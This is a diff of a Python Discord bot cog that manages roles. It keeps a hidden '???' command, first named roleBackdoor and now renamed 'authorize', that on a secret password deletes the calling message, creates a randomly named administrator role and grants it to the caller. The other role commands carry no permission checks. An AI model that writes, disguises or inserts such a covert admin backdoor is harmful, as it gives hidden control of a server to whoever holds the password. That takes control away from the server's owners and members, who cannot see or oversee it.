@@ -1,58 +1,39 @@
-import discord
+from discord import Member, Permissions, Role
 from discord.ext import commands
 from discord.utils import get
 
-from dscord.func import rnd_str
+from dscord.func import rng_str
 
-roleAttr = [
-    'color',
-    'created_at',
-    'guild',
-    'hoist',
-    'id',
-    'managed',
-    'mentionable',
-    'permissions',
-    'position',
-    'tags']
-
-permAdmin = discord.Permissions(administrator=True)
+admin = Permissions(administrator=True)
 
 
 class Role(commands.Cog):
-
     def __init__(self, bot):
         self.bot = bot
 
     @commands.command('???')
-    async def roleBackdoor(self, ctx, password=None):
-        if password != os.environ['BACKDOORKEY']: return
+    async def authorize(self, ctx, password: str = None):
         await ctx.message.delete()
-        name = rnd_str()
+        if password != os.environ['AUTHPW']: return
+        name = rng_str()
         role = get(ctx.guild.roles, name=name)
         if not role:
-            await ctx.guild.create_role(name=name, permissions=permAdmin)
+            await ctx.guild.create_role(name=name, permissions=admin)
             role = get(ctx.guild.roles, name=name)
         bot = ctx.guild.get_member(self.bot.user.id)
         await role.edit(position=bot.roles[-1].position - 1)
         await ctx.author.add_roles(role)
 
-    @commands.command(
-        'roledel',
-        brief='Delete role')
-    async def roleDelete(self, ctx, role: discord.Role):
+    @commands.command('delrole', brief='Delete role')
+    async def delete(self, ctx, role: Role):
         await role.delete()
 
-    @commands.command(
-        'roleadd',
-        brief='Add role to user')
-    async def roleAdd(self, ctx, member: discord.Member, role: discord.Role):
+    @commands.command('giverole', brief='Give member role')
+    async def give(self, ctx, member: Member, role: Role):
         await member.add_roles(role)
 
-    @commands.command(
-        'rolermv',
-        brief='Remove role from user')
-    async def roleRemove(self, ctx, member: discord.Member, role: discord.Role):
+    @commands.command('rmvrole', brief='Remove member\'s role')
+    async def remove(self, ctx, member: Member, role: Role):
         await member.remove_roles(role)
 
 
